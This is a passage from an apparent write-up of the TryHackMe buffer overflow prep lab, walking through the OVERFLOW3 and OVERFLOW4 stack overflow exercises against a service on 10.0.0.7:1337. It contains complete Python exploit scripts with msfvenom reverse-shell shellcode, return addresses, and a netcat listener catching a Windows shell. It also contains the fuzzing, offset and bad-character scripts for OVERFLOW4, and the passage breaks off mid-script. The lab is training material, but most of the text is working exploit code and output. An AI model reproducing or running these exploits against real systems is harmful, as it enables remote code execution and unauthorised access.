payload += b"\x7e\xfe\x21\x63\x7d\xd3\x81\x5a\x4e\x26\xc0"
payload += b"\x9b\xb3\xcb\x90\x74\xbf\x7e\x04\xf0\xf5\x42"
payload += b"\xaf\x4a\x1b\xc3\x4c\x1a\x1a\xe2\xc3\x10\x45"
payload += b"\x24\xe2\xf5\xfd\x6d\xfc\x1a\x3b\x27\x77\xe8"
payload += b"\xb7\xb6\x51\x20\x37\x14\x9c\x8c\xca\x64\xd9"
payload += b"\x2b\x35\x13\x13\x48\xc8\x24\xe0\x32\x16\xa0"
payload += b"\xf2\x95\xdd\x12\xde\x24\x31\xc4\x95\x2b\xfe"
payload += b"\x82\xf1\x2f\x01\x46\x8a\x54\x8a\x69\x5c\xdd"
payload += b"\xc8\x4d\x78\x85\x8b\xec\xd9\x63\x7d\x10\x39"
payload += b"\xcc\x22\xb4\x32\xe1\x37\xc5\x19\x6e\xfb\xe4"
payload += b"\xa1\x6e\x93\x7f\xd2\x5c\x3c\xd4\x7c\xed\xb5"
payload += b"\xf2\x7b\x12\xec\x43\x13\xed\x0f\xb4\x3a\x2a"
payload += b"\x5b\xe4\x54\x9b\xe4\x6f\xa4\x24\x31\x3f\xf4"
payload += b"\x8a\xea\x80\xa4\x6a\x5b\x69\xae\x64\x84\x89"
payload += b"\xd1\xae\xad\x20\x28\x39\xd8\xb4\x32\xbf\xb4"
payload += b"\xb6\x32\xbe\xff\x3e\xd4\xaa\xef\x16\x4f\x43"
payload += b"\x89\x32\x1b\xf2\x56\xe9\x66\x34\xdc\x1e\x97"
payload += b"\xfb\x15\x6a\x8b\x6c\xd6\x21\xf1\x3b\xe9\x9f"
payload += b"\x9d\xa0\x78\x44\x5d\xae\x60\xd3\x0a\xe7\x57"
payload += b"\x2a\xde\x15\xc1\x84\xfc\xe7\x97\xef\x44\x3c"
payload += b"\x64\xf1\x45\xb1\xd0\xd5\x55\x0f\xd8\x51\x01"
payload += b"\xdf\x8f\x0f\xff\x99\x79\xfe\xa9\x73\xd5\xa8"
payload += b"\x3d\x05\x15\x6b\x3b\x0a\x70\x1d\xa3\xbb\x2d"
payload += b"\x58\xdc\x74\xba\x6c\xa5\x68\x5a\x92\x7c\x29"
payload += b"\x7a\x71\x54\x44\x13\x2c\x3d\xe5\x7e\xcf\xe8"
payload += b"\x2a\x87\x4c\x18\xd3\x7c\x4c\x69\xd6\x39\xca"
payload += b"\x82\xaa\x52\xbf\xa4\x19\x52\xea\xa4\x9d\xac"
payload += b"\x15" 
```
{% endraw %}

<br />
Update the code with the script with the string from msfvenom.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x11\x40\x5f\xb8\xee

payload =  b""
payload += b"\xfc\xbb\x2e\x66\xb6\xa7\xeb\x0c\x5e\x56\x31"
payload += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
payload += b"\xff\xff\xff\xd2\x8e\x34\xa7\x2a\x4f\x59\x21"
payload += b"\xcf\x7e\x59\x55\x84\xd1\x69\x1d\xc8\xdd\x02"
payload += b"\x73\xf8\x56\x66\x5c\x0f\xde\xcd\xba\x3e\xdf"
payload += b"\x7e\xfe\x21\x63\x7d\xd3\x81\x5a\x4e\x26\xc0"
payload += b"\x9b\xb3\xcb\x90\x74\xbf\x7e\x04\xf0\xf5\x42"
payload += b"\xaf\x4a\x1b\xc3\x4c\x1a\x1a\xe2\xc3\x10\x45"
payload += b"\x24\xe2\xf5\xfd\x6d\xfc\x1a\x3b\x27\x77\xe8"
payload += b"\xb7\xb6\x51\x20\x37\x14\x9c\x8c\xca\x64\xd9"
payload += b"\x2b\x35\x13\x13\x48\xc8\x24\xe0\x32\x16\xa0"
payload += b"\xf2\x95\xdd\x12\xde\x24\x31\xc4\x95\x2b\xfe"
payload += b"\x82\xf1\x2f\x01\x46\x8a\x54\x8a\x69\x5c\xdd"
payload += b"\xc8\x4d\x78\x85\x8b\xec\xd9\x63\x7d\x10\x39"
payload += b"\xcc\x22\xb4\x32\xe1\x37\xc5\x19\x6e\xfb\xe4"
payload += b"\xa1\x6e\x93\x7f\xd2\x5c\x3c\xd4\x7c\xed\xb5"
payload += b"\xf2\x7b\x12\xec\x43\x13\xed\x0f\xb4\x3a\x2a"
payload += b"\x5b\xe4\x54\x9b\xe4\x6f\xa4\x24\x31\x3f\xf4"
payload += b"\x8a\xea\x80\xa4\x6a\x5b\x69\xae\x64\x84\x89"
payload += b"\xd1\xae\xad\x20\x28\x39\xd8\xb4\x32\xbf\xb4"
payload += b"\xb6\x32\xbe\xff\x3e\xd4\xaa\xef\x16\x4f\x43"
payload += b"\x89\x32\x1b\xf2\x56\xe9\x66\x34\xdc\x1e\x97"
payload += b"\xfb\x15\x6a\x8b\x6c\xd6\x21\xf1\x3b\xe9\x9f"
payload += b"\x9d\xa0\x78\x44\x5d\xae\x60\xd3\x0a\xe7\x57"
payload += b"\x2a\xde\x15\xc1\x84\xfc\xe7\x97\xef\x44\x3c"
payload += b"\x64\xf1\x45\xb1\xd0\xd5\x55\x0f\xd8\x51\x01"
payload += b"\xdf\x8f\x0f\xff\x99\x79\xfe\xa9\x73\xd5\xa8"
payload += b"\x3d\x05\x15\x6b\x3b\x0a\x70\x1d\xa3\xbb\x2d"
payload += b"\x58\xdc\x74\xba\x6c\xa5\x68\x5a\x92\x7c\x29"
payload += b"\x7a\x71\x54\x44\x13\x2c\x3d\xe5\x7e\xcf\xe8"
payload += b"\x2a\x87\x4c\x18\xd3\x7c\x4c\x69\xd6\x39\xca"
payload += b"\x82\xaa\x52\xbf\xa4\x19\x52\xea\xa4\x9d\xac"
payload += b"\x15"

inputBuffer = b'A' * 1274
inputBuffer += pack('<L',(0x62501203))
inputBuffer += b'\x90' * 16
inputBuffer += payload
inputBuffer += b'C' * (2100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW3]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ... 
```
{% endraw %}

<br />
Run the code and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW3]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56191
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Windows Kits\10\Debuggers>
```
{% endraw %}

<br />
<b><u>OVERFLOW4<br /></u></b>

Create a script that connects to the service and sends the OVERFLOW4 command mimicking normal usage.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
print(s.recv(1024))

s.send(b'OVERFLOW4 aaaa\r\n')
print(s.recv(1024))

s.close() 
```
{% endraw %}

<br />
Update the code to fuzz the command with increasing length to find the breakpoint.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

buffers = [b'A']
counter = 100
while len(buffers) < 30:
    buffers.append(b'A' * counter)
    counter += 100

for inputBuffer in buffers:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((url,port))
    s.recv(1024)

    print('[*] Sending: {size}'.format(size=len(inputBuffer)))
    s.send(b'OVERFLOW4 ' + inputBuffer + b'\r\n')
    s.recv(1024)

    s.close() 
```
{% endraw %}

<br />
Run the code and observe the breakpoint.

{% raw %}
```python
= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW4/thm-overflow4_0x01.py
[*] Sending: 1
[*] Sending: 100
[*] Sending: 200
[*] Sending: 300
[*] Sending: 400
[*] Sending: 500
[*] Sending: 600
[*] Sending: 700
[*] Sending: 800
[*] Sending: 900
[*] Sending: 1000
[*] Sending: 1100
[*] Sending: 1200
[*] Sending: 1300
[*] Sending: 1400
[*] Sending: 1500
[*] Sending: 1600
[*] Sending: 1700
[*] Sending: 1800
[*] Sending: 1900
[*] Sending: 2000
[*] Sending: 2100 
```
{% endraw %}

<br />
Check the EIP to ensure that we have control of EIP.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of4/firsteip.png" title="First EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the script to hardcode the size that breaks the buffer.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 2500

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Run the code and check EIP to ensure that we still have control.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of4/seceip.png" title="Second EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Generate msf-pattern_create to create a string to determine offset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
└─$ msf-pattern_create -l 2500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D 
```
{% endraw %}

<br />
Update the code with the pattern_create string that we just generated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# inputBuffer = b'A' * 2500
inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the EIP and note the value that is stored in the register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of4/thirdeip.png" title="Get EIP Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the string from the regster through msf-pattern_offset to get the exact offset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
└─$ msf-pattern_offset -l 2500 -q 70433570
[*] Exact match at offset 2026
```
{% endraw %}

<br />
Update the code to include the offset value that we just calculated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 2026
inputBuffer += b'B' * 4
inputBuffer += b'C' * (2500 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 2026
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2500 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the ESP register to view the baschars and find any mangles.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of4/firstbadesp.png" title="First Badchar ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\xa9\xcd\xd4

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 2026
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2500 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of4/narly.png" title="Load Narly" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run nmod to get a list of modules and their security to find the appropriate module.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of4/findaddy.png" title="Find address" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with the address that was discovered in the essfunc.dll.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\xa9\xcd\xd4

payload = b'D' * 400

inputBuffer = b'A' * 2026
inputBuffer += pack('<L',(0x625011af))
inputBuffer += payload
inputBuffer += b'C' * (2500 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

